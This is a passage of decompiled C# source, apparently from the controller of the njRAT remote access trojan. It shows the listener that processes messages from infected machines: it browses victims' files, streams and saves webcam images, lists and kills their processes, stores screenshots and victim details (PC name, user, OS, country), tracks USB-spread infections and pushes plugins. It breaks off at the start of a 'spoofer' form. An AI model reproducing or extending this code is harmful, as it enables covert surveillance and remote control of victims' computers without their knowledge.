																											fMcach.Path = FN.DEB(ref array2[3]);
																											frm_FileManager.Cache.Add(fMcach, fMcach.Path, null, null);
																											DirectoryInfo directoryInfo2 = new DirectoryInfo(FN.DEB(ref array2[3]));
																											flag3 = (Operators.CompareString(frm_FileManager.TextBox1.Text, directoryInfo2.FullName, false) == 0);
																											if (flag3)
																											{
																												frm_FileManager.pr.Value = 0;
																												string[] array14 = Strings.Split(array2[4], ";", -1, CompareMethod.Binary);
																												frm_FileManager.pr.Maximum = array14.Length - 1;
																												frm_FileManager.L2.Items.Clear();
																												flag3 = (directoryInfo2.Parent != null);
																												if (flag3)
																												{
																													ListViewItem listViewItem3 = frm_FileManager.L2.Items.Add("..", "..", 0);
																													listViewItem3.ToolTipText = directoryInfo2.Parent.FullName;
																													listViewItem3.SubItems.Add("");
																													listViewItem3.SubItems.Add("DIR");
																												}
																												frm_FileManager.MG2.Images.Clear();
																												frm_FileManager.MG2.Images.Add(frm_FileManager.MG.Images[0]);
																												frm_FileManager.MG2.Images.Add("*", frm_FileManager.MG.Images[4]);
																												int num12 = array14.Length - 2;
																												for (int n = 0; n <= num12; n++)
																												{
																													flag3 = (Operators.CompareString(frm_FileManager.TextBox1.Text, directoryInfo2.FullName, false) != 0);
																													if (flag3)
																													{
																														return;
																													}
																													ListViewItem listViewItem4 = frm_FileManager.L2.Items.Add(directoryInfo2.FullName + FN.DEB(ref array14[n]), FN.DEB(ref array14[n]), 0);
																													listViewItem4.SubItems.Add("");
																													listViewItem4.SubItems.Add("DIR");
																													listViewItem4.ToolTipText = directoryInfo2.FullName + listViewItem4.Text;
																													fMcach.folders.Add(listViewItem4.ToolTipText);
																													ToolStripProgressBar pr = frm_FileManager.pr;
																													ToolStripProgressBar toolStripProgressBar = pr;
																													toolStripProgressBar.Value++;
																												}
																												frm_FileManager.TextBox1.BackColor = Color.Gainsboro;
																												frm_FileManager.L2.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
																												client.Send("@" + sokserver.Y + array2[3]);
																												frm_FileManager.pr.Value = 0;
																											}
																										}
																									}
																									else
																									{
																										flag3 = (Operators.CompareString(left5, "#", false) == 0);
																										if (flag3)
																										{
																											ToolStripProgressBar pr3 = frm_FileManager.pr;
																											ToolStripProgressBar obj9 = pr3;
																											lock (obj9)
																											{
																												FMcach fMcach2 = (FMcach)frm_FileManager.Cache[FN.DEB(ref array2[3])];
																												string text7 = FN.DEB(ref array2[3]);
																												flag3 = (Operators.CompareString(frm_FileManager.TextBox1.Text, text7, false) == 0);
																												if (flag3)
																												{
																													frm_FileManager.pr.Value = 0;
																													string[] array15 = Strings.Split(array2[4], ";", -1, CompareMethod.Binary);
																													frm_FileManager.pr.Maximum = array15.Length - 1;
																													int num13 = array15.Length - 2;
																													for (int num14 = 0; num14 <= num13; num14++)
																													{
																														string[] array16 = Strings.Split(FN.DEB(ref array15[num14]), ";", -1, CompareMethod.Binary);
																														flag3 = (Operators.CompareString(frm_FileManager.TextBox1.Text, text7, false) != 0);
																														if (flag3)
																														{
																															return;
																														}
																														ListViewItem listViewItem5 = frm_FileManager.L2.Items.Add(text7 + array16[0], array16[0], 1);
																														FileInfo fileInfo = new FileInfo(text7 + array16[0]);
																														listViewItem5.ToolTipText = fileInfo.FullName;
																														listViewItem5.SubItems.Add(FN.Siz(Conversions.ToLong(array16[1])));
																														flag3 = (Operators.CompareString(fileInfo.Extension, "", false) == 0);
																														if (flag3)
																														{
																															listViewItem5.SubItems.Add("");
																														}
																														else
																														{
																															listViewItem5.SubItems.Add(fileInfo.Extension.Replace(".", ""));
																															flag3 = !frm_FileManager.MG2.Images.ContainsKey(fileInfo.Extension);
																															if (flag3)
																															{
																																File.Create(Application.StartupPath + "\\!" + fileInfo.Extension).Close();
																																frm_FileManager.MG2.Images.Add(fileInfo.Extension, Icon.ExtractAssociatedIcon(Application.StartupPath + "\\!" + fileInfo.Extension));
																																File.Delete(Application.StartupPath + "\\!" + fileInfo.Extension);
																																listViewItem5.ImageKey = fileInfo.Extension;
																															}
																															else
																															{
																																listViewItem5.ImageKey = fileInfo.Extension;
																															}
																														}
																														fMcach2.files.Add(string.Concat(new string[]
																														{
																															listViewItem5.ToolTipText,
																															";",
																															listViewItem5.SubItems[1].Text,
																															";",
																															listViewItem5.SubItems[2].Text
																														}));
																														ToolStripProgressBar pr = frm_FileManager.pr;
																														ToolStripProgressBar toolStripProgressBar = pr;
																														toolStripProgressBar.Value++;
																													}
																													frm_FileManager.TextBox1.BackColor = Color.WhiteSmoke;
																													frm_FileManager.L2.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
																													frm_FileManager.pr.Value = 0;
																												}
																											}
																										}
																										else
																										{
																											flag3 = (Operators.CompareString(left5, "$", false) == 0);
																											if (flag3)
																											{
																												flag2 = sokserver.F.InvokeRequired;
																												if (flag2)
																												{
																													sokserver.F.Invoke(new sokserver._Req(sokserver.Req), new object[]
																													{
																														RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(obj)))
																													});
																												}
																												else
																												{
																													flag3 = frm_FileManager.Images.Contains(FN.DEB(ref array2[3]));
																													if (flag3)
																													{
																														frm_FileManager.Images.Remove(FN.DEB(ref array2[3]));
																													}
																													frm_FileManager.Images.Add(Image.FromStream(new MemoryStream(Convert.FromBase64String(array2[4]))), FN.DEB(ref array2[3]), null, null);
																													flag3 = (frm_FileManager.L2.Items.ContainsKey(FN.DEB(ref array2[3])) && frm_FileManager.L2.Items[FN.DEB(ref array2[3])].Selected);
																													if (flag3)
																													{
																														frm_FileManager.P.Image = (Image)frm_FileManager.Images[FN.DEB(ref array2[3])];
																														frm_FileManager.P.Visible = true;
																													}
																												}
																											}
																											else
																											{
																												flag3 = (Operators.CompareString(left5, "%", false) == 0);
																												if (flag3)
																												{
																													flag2 = sokserver.F.InvokeRequired;
																													if (flag2)
																													{
																														sokserver.F.Invoke(new sokserver._Req(sokserver.Req), new object[]
																														{
																															RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(obj)))
																														});
																													}
																													else
																													{
																														Frm_Note frm_Note = new Frm_Note();
																														frm_Note.FNN = FN.DEB(ref array2[3]);
																														frm_Note.Text = frm_FileManager.QQ + " - " + frm_Note.FNN;
																														frm_Note.SK = frm_FileManager.sk;
																														frm_Note.TextBox1.Text = FN.DEB(ref array2[4]).Replace("\0", "");
																														frm_Note.Show();
																														frm_Note.SaveToolStripMenuItem.Enabled = false;
																													}
																												}
																												else
																												{
																													flag3 = (Operators.CompareString(left5, "dl", false) == 0);
																													if (flag3)
																													{
																														IEnumerator enumerator = null;
																														string[] array17 = Strings.Split(FN.DEB(ref array2[3]), ";", -1, CompareMethod.Binary);
																														try
																														{
																															enumerator = frm_FileManager.L2.Items.GetEnumerator();
																															while (enumerator.MoveNext())
																															{
																																ListViewItem listViewItem6 = (ListViewItem)enumerator.Current;
																																flag3 = (Operators.CompareString(array17[1], "*", false) == 0);
																																if (flag3)
																																{
																																	flag2 = !(Operators.CompareString(listViewItem6.Text, new DirectoryInfo(array17[0]).Name, false) == 0 & Operators.CompareString(listViewItem6.SubItems[2].Text, "DIR", false) == 0);
																																	if (!flag2)
																																	{
																																		listViewItem6.Remove();
																																		break;
																																	}
																																}
																																else
																																{
																																	flag3 = (Operators.CompareString(listViewItem6.Text, new DirectoryInfo(array17[0]).Name, false) == 0 & Operators.CompareString(listViewItem6.SubItems[2].Text, "DIR", false) != 0);
																																	if (flag3)
																																	{
																																		listViewItem6.Remove();
																																		break;
																																	}
																																}
																															}
																														}
																														finally
																														{
																															flag3 = (enumerator is IDisposable);
																															if (flag3)
																															{
																																(enumerator as IDisposable).Dispose();
																															}
																														}
																													}
																													else
																													{
																														flag3 = (Operators.CompareString(left5, "nm", false) == 0);
																														if (flag3)
																														{
																															IEnumerator enumerator2 = null;
																															string[] array18 = Strings.Split(FN.DEB(ref array2[3]), ";", -1, CompareMethod.Binary);
																															try
																															{
																																enumerator2 = frm_FileManager.L2.Items.GetEnumerator();
																																while (enumerator2.MoveNext())
																																{
																																	ListViewItem listViewItem7 = (ListViewItem)enumerator2.Current;
																																	flag3 = (Operators.CompareString(listViewItem7.ToolTipText, array18[0], false) == 0);
																																	if (flag3)
																																	{
																																		flag2 = (Operators.CompareString(array18[2], "*", false) == 0);
																																		if (flag2)
																																		{
																																			DirectoryInfo directoryInfo3 = new DirectoryInfo(array18[0]);
																																			listViewItem7.Text = array18[1];
																																			listViewItem7.ToolTipText = directoryInfo3.Parent.FullName + "\\" + listViewItem7.Text;
																																		}
																																		else
																																		{
																																			FileInfo fileInfo2 = new FileInfo(array18[0]);
																																			listViewItem7.Text = array18[1];
																																			listViewItem7.ToolTipText = fileInfo2.Directory.FullName + Conversions.ToString(unchecked(Conversions.ToDouble("\\") * Conversions.ToDouble(listViewItem7.Text)));
																																			listViewItem7.SubItems[2].Text = new FileInfo(listViewItem7.ToolTipText).Extension.Replace(".", "");
																																		}
																																	}
																																}
																															}
																															finally
																															{
																																flag3 = (enumerator2 is IDisposable);
																																if (flag3)
																																{
																																	(enumerator2 as IDisposable).Dispose();
																																}
																															}
																														}
																														else
																														{
																															flag3 = (Operators.CompareString(left5, "ER", false) == 0);
																															if (flag3)
																															{
																																frm_FileManager.SL.Text = "Error " + array2[4];
																															}
																														}
																													}
																												}
																											}
																										}
																									}
																								}
																							}
																						}
																					}
																					else
																					{
																						flag3 = (Operators.CompareString(text, "CAM", false) == 0);
																						if (flag3)
																						{
																							flag2 = (client.L == null);
																							if (flag2)
																							{
																								client.L = new ListViewItem();
																							}
																							Frm_Cam frm_Cam = (Frm_Cam)sokserver.Gform("cam" + client.ip());
																							string left7 = array2[2];
																							flag3 = (Operators.CompareString(left7, "~", false) == 0);
																							if (flag3)
																							{
																								flag2 = (frm_Cam == null);
																								if (flag2)
																								{
																									flag = sokserver.F.InvokeRequired;
																									if (flag)
																									{
																										sokserver.F.Invoke(new sokserver._Req(sokserver.Req), new object[]
																										{
																											RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(obj)))
																										});
																									}
																									else
																									{
																										frm_Cam = new Frm_Cam();
																										frm_Cam.sk = client;
																										frm_Cam.osk = sokserver.W.GetClient(array2[1]);
																										frm_Cam.Name = "cam" + client.ip();
																										int num15 = array2.Length - 1;
																										for (int num16 = 3; num16 <= num15; num16++)
																										{
																											frm_Cam.ComboBox1.SelectedIndex = frm_Cam.ComboBox1.Items.Add(array2[num16]);
																										}
																										frm_Cam.Show();
																									}
																								}
																								else
																								{
																									int num17 = array2.Length - 1;
																									for (int num18 = 3; num18 <= num17; num18++)
																									{
																										frm_Cam.ComboBox1.SelectedIndex = frm_Cam.ComboBox1.Items.Add(array2[num18]);
																									}
																								}
																							}
																							else
																							{
																								flag3 = (Operators.CompareString(left7, "!", false) == 0);
																								if (flag3)
																								{
																									flag2 = (Operators.CompareString(array2[3], "!", false) != 0);
																									if (flag2)
																									{
																										Image image2 = Image.FromStream(new MemoryStream(Convert.FromBase64String(array2[3])));
																										flag3 = frm_Cam.CheckBox3.Checked;
																										if (flag3)
																										{
																											try
																											{
																												image2.Save(frm_Cam.folder + MyProject.Computer.Clock.LocalTime.ToString().Replace("/", "").Replace(":", "-") + Conversions.ToString((int)Math.Round(Math.Round((double)MyProject.Computer.Clock.LocalTime.Millisecond / 100.0))) + ".jpg");
																											}
																											catch (Exception expr_2E60)
																											{
																												ProjectData.SetProjectError(expr_2E60);
																												Exception projectError9 = expr_2E60;
																												ProjectData.SetProjectError(projectError9);
																												ProjectData.ClearProjectError();
																												ProjectData.ClearProjectError();
																											}
																										}
																										frm_Cam.PictureBox1.Image = image2;
																										frm_Cam.Text = frm_Cam.QQ + " Size: " + FN.Siz(unchecked((long)array2[3].Length));
																									}
																									flag3 = (Operators.CompareString(frm_Cam.Button1.Text, "Stop", false) == 0);
																									if (flag3)
																									{
																										NewLateBinding.LateCall(client, null, "Send", new object[]
																										{
																											RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject("!" + sokserver.Y + Conversions.ToString(frm_Cam.ComboBox1.SelectedIndex) + sokserver.Y, RuntimeHelpers.GetObjectValue(frm_Cam.ComboBox2.SelectedItem)))
																										}, null, null, null, true);
																									}
																									else
																									{
																										client.Send("@");
																									}
																								}
																							}
																						}
																						else
																						{
																							flag3 = (Operators.CompareString(text, "proc", false) == 0);
																							if (flag3)
																							{
																								flag2 = (client.L == null);
																								if (flag2)
																								{
																									client.L = new ListViewItem();
																								}
																								Frm_Process frm_Process = (Frm_Process)sokserver.Gform("proc" + client.ip());
																								flag3 = (frm_Process == null);
																								if (flag3)
																								{
																									flag2 = sokserver.F.InvokeRequired;
																									if (flag2)
																									{
																										sokserver.F.Invoke(new sokserver._Req(sokserver.Req), new object[]
																										{
																											RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(obj)))
																										});
																										return;
																									}
																									frm_Process = new Frm_Process();
																									frm_Process.sk = client;
																									frm_Process.osk = sokserver.W.GetClient(array2[1]);
																									frm_Process.Name = "proc" + client.ip();
																									frm_Process.Show();
																								}
																								flag3 = (array2.Length > 2);
																								if (flag3)
																								{
																									string left8 = array2[2];
																									flag2 = (Operators.CompareString(left8, "pid", false) == 0);
																									if (flag2)
																									{
																										frm_Process.ID = Conversions.ToInteger(array2[3]);
																									}
																									else
																									{
																										flag3 = (Operators.CompareString(left8, "~", false) == 0);
																										if (flag3)
																										{
																											frm_Process.L1.Items.Clear();
																											frm_Process.pr.Value = 0;
																											frm_Process.pr.Maximum = Conversions.ToInteger(array2[3]);
																										}
																										else
																										{
																											flag3 = (Operators.CompareString(left8, "!", false) == 0);
																											if (flag3)
																											{
																												int num19 = array2.Length - 1;
																												for (int num20 = 3; num20 <= num19; num20++)
																												{
																													try
																													{
																														ToolStripProgressBar pr = frm_Process.pr;
																														ToolStripProgressBar toolStripProgressBar = pr;
																														toolStripProgressBar.Value++;
																													}
																													catch (Exception expr_312D)
																													{
																														ProjectData.SetProjectError(expr_312D);
																														Exception projectError10 = expr_312D;
																														ProjectData.SetProjectError(projectError10);
																														ProjectData.ClearProjectError();
																														ProjectData.ClearProjectError();
																													}
																													string[] array19 = Strings.Split(array2[num20], ",", -1, CompareMethod.Binary);
																													ListViewItem listViewItem8 = frm_Process.L1.Items.Add(array19[1].ToString(), Strings.Split(array19[0], "\\", -1, CompareMethod.Binary)[Strings.Split(array19[0], "\\", -1, CompareMethod.Binary).Length - 1], 0);
																													listViewItem8.SubItems.Add(array19[1]);
																													flag3 = (Conversions.ToDouble(array19[1]) == (double)frm_Process.ID);
																													if (flag3)
																													{
																														listViewItem8.ForeColor = Color.Red;
																													}
																													flag3 = array19[0].Contains(":\\");
																													if (flag3)
																													{
																														listViewItem8.SubItems.Add(array19[0]);
																													}
																													else
																													{
																														listViewItem8.SubItems.Add("");
																													}
																												}
																												frm_Process.pr.Visible = false;
																												frm_Process.L1.FX();
																												frm_Process.L1.ColumnClick(frm_Process.L1, new ColumnClickEventArgs(0));
																												flag3 = frm_Process.L1.Columns[0].Text.StartsWith("-");
																												if (flag3)
																												{
																													frm_Process.L1.ColumnClick(frm_Process.L1, new ColumnClickEventArgs(0));
																												}
																											}
																											else
																											{
																												flag3 = (Operators.CompareString(left8, "RM", false) == 0);
																												if (flag3)
																												{
																													frm_Process.SL.Text = frm_Process.L1.Items[array2[3]].Text + "[" + array2[3] + "] Killed";
																													frm_Process.L1.Items[array2[3]].Remove();
																												}
																												else
																												{
																													flag3 = (Operators.CompareString(left8, "ER", false) == 0);
																													if (flag3)
																													{
																														frm_Process.SL.Text = string.Concat(new string[]
																														{
																															"[proc.dll] Error At [",
																															array2[3],
																															"] MSG=[",
																															array2[4],
																															"]"
																														});
																														sokserver.Log(string.Concat(new string[]
																														{
																															"[proc.dll] Error At [",
																															array2[3],
																															"] Client=[",
																															frm_Process.osk.ip(),
																															"/",
																															frm_Process.osk.L.Text,
																															"] MSG=[",
																															array2[4],
																															"]"
																														}));
																													}
																												}
																											}
																										}
																									}
																								}
																							}
																							else
																							{
																								flag3 = (Operators.CompareString(text, "lv", false) == 0);
																								if (flag3)
																								{
																									ListView.ListViewItemCollection items = sokserver.F.L1V.Items;
																									lock (items)
																									{
																										try
																										{
																											flag3 = (client.L != null);
																											if (flag3)
																											{
																												client.L.Remove();
																											}
																											client.Folder = Application.StartupPath + "\\nj_Users\\";
																											sokserver.F.L1V.SuspendLayout();
																											client.L = sokserver.F.L1V.Items.Add(client.ip(), FN.DEB(ref array2[1]), 0);
																											client.L.ToolTipText = client.ip();
																											client.L.Tag = client;
																											client.L.SubItems.Add(Strings.Split(client.ip(), ":", -1, CompareMethod.Binary)[0]);
																											int num21 = array2.Length - 2;
																											for (int num22 = 2; num22 <= num21; num22++)
																											{
																												int num23 = num22;
																												flag3 = (num23 == sokserver.hac);
																												if (flag3)
																												{
																													client.L.SubItems.Add(FN.DEB(ref array2[num22]));
																												}
																												else
																												{
																													flag3 = (num23 == sokserver.hco);
																													if (flag3)
																													{
																														flag2 = (sokserver.F.L1V.SmallImageList == sokserver.F.IMG2);
																														if (flag2)
																														{
																															flag = !sokserver.F.IMG2.Images.ContainsKey(array2[num22] + ".png");
																															if (flag)
																															{
																																client.L.ImageKey = "X.png";
																															}
																															else
																															{
																																client.L.ImageKey = array2[num22] + ".png";
																															}
																														}
																														else
																														{
																															client.L.ImageKey = "s";
																														}
																														client.L.SubItems.Add(array2[num22]);
																													}
																													else
																													{
																														client.L.SubItems.Add(array2[num22]);
																													}
																												}
																											}
																											Client client2 = client;
																											client2.Folder = string.Concat(new string[]
																											{
																												client2.Folder,
																												client.L.SubItems[sokserver.hpc].Text,
																												"_",
																												client.L.SubItems[sokserver.huser].Text,
																												"_",
																												Strings.Split(client.L.Text, "_", -1, CompareMethod.Binary)[Strings.Split(client.L.Text, "_", -1, CompareMethod.Binary).Length - 1],
																												"\\"
																											});
																											sokserver.F.L1V.ResumeLayout();
																											client.plg.AddRange(Strings.Split(array2[array2.Length - 1], ",", -1, CompareMethod.Binary));
																										}
																										catch (Exception expr_3715)
																										{
																											ProjectData.SetProjectError(expr_3715);
																											Exception projectError11 = expr_3715;
																											ProjectData.SetProjectError(projectError11);
																											ProjectData.ClearProjectError();
																											ProjectData.ClearProjectError();
																										}
																									}
																									try
																									{
																										client.pc = (Bitmap)Image.FromStream(new MemoryStream(File.ReadAllBytes(client.Folder + "sc.jpg")));
																									}
																									catch (Exception expr_376F)
																									{
																										ProjectData.SetProjectError(expr_376F);
																										Exception projectError12 = expr_376F;
																										ProjectData.SetProjectError(projectError12);
																										ProjectData.ClearProjectError();
																										ProjectData.ClearProjectError();
																									}
																									try
																									{
																										flag3 = !sokserver.F.IMG2.Images.ContainsKey(client.L.SubItems[sokserver.hco].Text + ".png");
																										Bitmap flg;
																										if (flag3)
																										{
																											flg = (Bitmap)sokserver.F.IMG2.Images["X.png"];
																										}
																										else
																										{
																											flg = (Bitmap)sokserver.F.IMG2.Images[client.L.SubItems[sokserver.hco].Text + ".png"];
																										}
																										sokserver.nt.Add(flg, client.L.Text, new string[]
																										{
																											client.L.SubItems[1].Text,
																											client.L.SubItems[sokserver.hpc].Text,
																											client.L.SubItems[sokserver.huser].Text,
																											client.L.SubItems[sokserver.hos].Text,
																											client.L.SubItems[sokserver.hco].Text
																										});
																									}
																									catch (Exception expr_38F2)
																									{
																										ProjectData.SetProjectError(expr_38F2);
																										Exception projectError13 = expr_38F2;
																										ProjectData.SetProjectError(projectError13);
																										ProjectData.ClearProjectError();
																										ProjectData.ClearProjectError();
																									}
																									flag3 = (sokserver.F.L1V.Items.Count < 10);
																									if (flag3)
																									{
																										sokserver.F.L1V.FX();
																									}
																									sokserver.Log("Logged " + client.ip() + " " + FN.DEB(ref array2[1]));
																									flag3 = sokserver.ensr;
																									if (flag3)
																									{
																										sokserver.F.L1V.EnsureVisible(sokserver.F.L1V.Items.Count - 1);
																									}
																								}
																								else
																								{
																									flag3 = (Operators.CompareString(text, "P", false) == 0);
																									if (flag3)
																									{
																										flag2 = (client.L != null && client.L.SubItems.Count > sokserver.hping);
																										if (flag2)
																										{
																											ListView.ListViewItemCollection items2 = sokserver.F.L1V.Items;
																											ListView.ListViewItemCollection obj10 = items2;
																											lock (obj10)
																											{
																												client.L.SubItems[sokserver.hping].Text = array2[1] + "n-j";
																											}
																										}
																									}
																									else
																									{
																										flag3 = (Operators.CompareString(text, "bla", false) == 0);
																										if (flag3)
																										{
																											flag2 = client.IsUSB;
																											if (flag2)
																											{
																												client.L.ForeColor = Color.LightSteelBlue;
																											}
																										}
																										else
																										{
																											flag3 = (Operators.CompareString(text, "~", false) == 0);
																											if (flag3)
																											{
																												client.Send("~");
																											}
																											else
																											{
																												flag3 = (Operators.CompareString(text, "ER", false) == 0);
																												if (flag3)
																												{
																													sokserver.Log(string.Concat(new string[]
																													{
																														"Error From [",
																														client.ip(),
																														"/",
																														client.L.Text,
																														"] At [",
																														array2[1],
																														"] MSG [",
																														array2[2],
																														"]"
																													}));
																												}
																												else
																												{
																													flag3 = (Operators.CompareString(text, "!", false) == 0);
																													if (flag3)
																													{
																														flag2 = (client != null);
																														if (flag2)
																														{
																															List<Client> iSAd = sokserver.ISAd;
																															List<Client> obj11 = iSAd;
																															lock (obj11)
																															{
																																client.Isend = false;
																																flag3 = sokserver.ISAd.Contains(client);
																																if (flag3)
																																{
																																	sokserver.ISAd.Remove(client);
																																}
																															}
																															flag3 = (sokserver.F.CEL == client);
																															if (flag3)
																															{
																																PictureBox p2 = sokserver.F.P1;
																																PictureBox obj12 = p2;
																																lock (obj12)
																																{
																																	sokserver.F.CEL = null;
																																	sokserver.F.P1.Image = null;
																																}
																																sokserver.F.L2.Items[0].SubItems[1].Text = "";
																																sokserver.F.L2.Items[1].SubItems[1].Text = "";
																																sokserver.F.L2.Items[2].SubItems[1].Text = "";
																																sokserver.F.L2.Items[3].SubItems[1].Text = "";
																																sokserver.F.L2.AutoResizeColumns(ColumnHeaderAutoResizeStyle.ColumnContent);
																															}
																															flag3 = client.IsUSB;
																															if (flag3)
																															{
																																List<Client> list3 = sokserver.usb;
																																List<Client> obj13 = list3;
																																lock (obj13)
																																{
																																	sokserver.usb.Remove(client);
																																}
																															}
																															flag3 = (client.pc != null);
																															if (flag3)
																															{
																																client.pc.Dispose();
																																client.pc = null;
																															}
																															client.snf = null;
																															client.plg.Clear();
																															flag3 = (client.L != null);
																															if (flag3)
																															{
																																ListView.ListViewItemCollection items3 = sokserver.F.L1V.Items;
																																ListView.ListViewItemCollection obj14 = items3;
																																lock (obj14)
																																{
																																	sokserver.F.L1V.Items.Remove(client.L);
																																}
																															}
																															try
																															{
																																ImageList smallImageList = sokserver.F.L1V.SmallImageList;
																																ImageList obj15 = smallImageList;
																																lock (obj15)
																																{
																																	sokserver.F.IMG.Images.RemoveByKey(client.ip());
																																}
																															}
																															catch (Exception expr_3DC8)
																															{
																																ProjectData.SetProjectError(expr_3DC8);
																																Exception projectError14 = expr_3DC8;
																																ProjectData.SetProjectError(projectError14);
																																ProjectData.ClearProjectError();
																																ProjectData.ClearProjectError();
																															}
																														}
																													}
																													else
																													{
																														flag3 = (Operators.CompareString(text, "pl", false) == 0);
																														if (flag3)
																														{
																															try
																															{
																																client.plg.Remove(array2[1]);
																															}
																															catch (Exception expr_3E1C)
																															{
																																ProjectData.SetProjectError(expr_3E1C);
																																Exception projectError15 = expr_3E1C;
																																ProjectData.SetProjectError(projectError15);
																																ProjectData.ClearProjectError();
																																ProjectData.ClearProjectError();
																															}
																															flag3 = (Operators.CompareString(array2[2].ToString(), "0", false) == 0);
																															if (flag3)
																															{
																																client.plg.Add(array2[1]);
																															}
																															else
																															{
																																sokserver.SendPlug(client, sokserver.GETPLG(null, array2[1]), Conversions.ToBoolean(array2[2]));
																															}
																														}
																														else
																														{
																															flag3 = (Operators.CompareString(text, "CAP", false) == 0);
																															if (flag3)
																															{
																																List<Client> iSAd2 = sokserver.ISAd;
																																List<Client> obj16 = iSAd2;
																																lock (obj16)
																																{
																																	client.Isend = false;
																																	flag3 = sokserver.ISAd.Contains(client);
																																	if (flag3)
																																	{
																																		sokserver.ISAd.Remove(client);
																																	}
																																}
																																byte[] buffer = (byte[])NewLateBinding.LateIndexGet(FN.fx(array, sokserver.Y), new object[]
																																{
																																	1
																																}, null);
																																client.pc = (Bitmap)Image.FromStream(new MemoryStream(buffer)).Clone();
																																try
																																{
																																	flag3 = !Directory.Exists(client.Folder);
																																	if (flag3)
																																	{
																																		Directory.CreateDirectory(client.Folder);
																																	}
																																	NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(client.pc.Clone()), null, "Save", new object[]
																																	{
																																		client.Folder + "sc.jpg"
																																	}, null, null, null, true);
																																}
																																catch (Exception expr_3F96)
																																{
																																	ProjectData.SetProjectError(expr_3F96);
																																	Exception projectError16 = expr_3F96;
																																	ProjectData.SetProjectError(projectError16);
																																	ProjectData.ClearProjectError();
																																	ProjectData.ClearProjectError();
																																}
																																flag3 = (sokserver.F.CEL == client);
																																if (flag3)
																																{
																																	PictureBox p3 = sokserver.F.P1;
																																	PictureBox obj17 = p3;
																																	lock (obj17)
																																	{
																																		sokserver.F.P1.Image = (Image)client.pc.Clone();
																																	}
																																}
																																ImageList smallImageList2 = sokserver.F.L1V.SmallImageList;
																																ImageList obj18 = smallImageList2;
																																lock (obj18)
																																{
																																	flag3 = !sokserver.F.IMG.Images.ContainsKey(client.ip());
																																	if (flag3)
																																	{
																																		sokserver.F.IMG.Images.Add(client.ip(), client.pc);
																																	}
																																	else
																																	{
																																		int index = sokserver.F.IMG.Images.IndexOfKey(client.ip());
																																		sokserver.F.IMG.Images.Add(client.ip(), client.pc);
																																		sokserver.F.IMG.Images.RemoveAt(index);
																																	}
																																	flag3 = (sokserver.F.L1V.SmallImageList == sokserver.F.IMG);
																																	if (flag3)
																																	{
																																		client.L.ImageKey = "";
																																		client.L.ImageKey = client.ip();
																																	}
																																}
																															}
																															else
																															{
																																flag3 = (Operators.CompareString(text, "act", false) == 0);
																																if (flag3)
																																{
																																	ListView.ListViewItemCollection items4 = sokserver.F.L1V.Items;
																																	ListView.ListViewItemCollection obj19 = items4;
																																	lock (obj19)
																																	{
																																		flag3 = (client.L != null);
																																		if (flag3)
																																		{
																																			client.L.SubItems[sokserver.hac].Text = FN.DEB(ref array2[1]);
																																		}
																																	}
																																}
																															}
																														}
																													}
																												}
																											}
																										}
																									}
																								}
																							}
																						}
																					}
																				}
																			}
																		}
																	}
																}
															}
														}
													}
												}
											}
										}
									}
								}
							}
						}
					}
				}
				catch (Exception expr_41A3)
				{
					ProjectData.SetProjectError(expr_41A3);
					Exception ex = expr_41A3;
					ProjectData.SetProjectError(ex);
					Exception ex2 = ex;
					bool flag3 = Operators.CompareString(array2[0], "up", false) == 0 | Operators.CompareString(array2[0], "dw", false) == 0;
					if (flag3)
					{
						try
						{
							client.Send("close" + sokserver.Y + array2[1]);
						}
						catch (Exception expr_41FD)
						{
							ProjectData.SetProjectError(expr_41FD);
							Exception projectError17 = expr_41FD;
							ProjectData.SetProjectError(projectError17);
							ProjectData.ClearProjectError();
							ProjectData.ClearProjectError();
						}
						ProjectData.ClearProjectError();
					}
					else
					{
						flag3 = (Operators.CompareString(array2[0].ToLower(), "cap", false) == 0);
						if (flag3)
						{
							List<Client> iSAd3 = sokserver.ISAd;
							List<Client> obj20 = iSAd3;
							lock (obj20)
							{
								client.Isend = false;
								flag3 = sokserver.ISAd.Contains(client);
								if (flag3)
								{
									sokserver.ISAd.Remove(client);
								}
							}
						}
						sokserver.Log(string.Concat(new string[]
						{
							"Listner Error At[",
							array2[0],
							"] MSG[",
							ex2.Message,
							"]"
						}));
						ProjectData.ClearProjectError();
					}
					ProjectData.ClearProjectError();
				}
			}
		}
	}
}

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace nj
{
	[DesignerGenerated]
	public class spoofer : Form
	{
		private static List<WeakReference> __ENCList = new List<WeakReference>();

		private IContainer components;

		[AccessedThroughProperty("Box1")]
		private LogInTitledListBox _Box1;

		[AccessedThroughProperty("Button1")]
		private Button _Button1;

		[AccessedThroughProperty("Button2")]
		private Button _Button2;

		[AccessedThroughProperty("Label1")]
		private Label _Label1;

		[AccessedThroughProperty("LogIox5")]
		private LogInRichTextBox _LogIox5;

		[AccessedThroughProperty("LogInRichTextBox1")]
		private LogInRichTextBox _LogInRichTextBox1;

		[AccessedThroughProperty("Button4")]
		private Button _Button4;

		[AccessedThroughProperty("Button5")]
		private Button _Button5;

		[AccessedThroughProperty("Button3")]
		private Button _Button3;

		[AccessedThroughProperty("Button6")]
		private Button _Button6;

		[AccessedThroughProperty("Button7")]
		private Button _Button7;

		[AccessedThroughProperty("Button8")]
		private Button _Button8;

		[AccessedThroughProperty("Button9")]
		private Button _Button9;

		[AccessedThroughProperty("ComboBox1")]
		private LogInComboBox _ComboBox1;

		private OpenFileDialog OpenFileDialog;

		internal virtual LogInTitledListBox Box1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Box1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Box1_Click);
				bool flag = this._Box1 != null;
				if (flag)
				{
					this._Box1.Click -= value2;
				}
				this._Box1 = value;
				flag = (this._Box1 != null);
				if (flag)
				{
